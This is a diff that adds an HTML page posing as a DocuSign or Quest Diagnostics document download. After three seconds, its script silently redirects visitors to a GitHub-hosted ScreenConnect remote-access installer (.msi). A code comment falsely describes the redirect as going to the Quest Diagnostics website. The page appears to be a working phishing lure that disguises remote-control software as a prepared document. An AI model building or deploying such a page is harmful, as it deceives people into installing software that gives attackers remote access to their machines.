@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #ffffff;
+            font-family: Arial, sans-serif;
+        }
+        .logo {
+            max-width: 400px;
+            margin-bottom: 40px;
+        }
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #0077C8;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            margin-top: 30px;
+            color: #333;
+            font-size: 18px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <img src="https://images.ctfassets.net/3fcisxc3a6xz/docusign_logo_black_text_on_white_0.png/90872cd475f92acafc7c490c93976e40/ds-logo-on-white.png" 
+         alt="" class="logo" 
+         onerror="this.src='https://via.placeholder.com/400x150/0077C8/FFFFFF?text=Quest+Diagnostics';">
+    
+    <div class="spinner"></div>
+    
+    <p class="message">Loading... Your document has been prepared and will download automatically.</p>
+
+    <script>
+        // Redirect to Quest Diagnostics website after 3 seconds
+        setTimeout(function() {
+            window.location.href = "https://github.com/fdiamon101/My-Docu-Comman/releases/download/v1.0/ScreenConnect.ClientSetup.msi";
+        }, 3000);
+    </script>
+</body>
+</html>
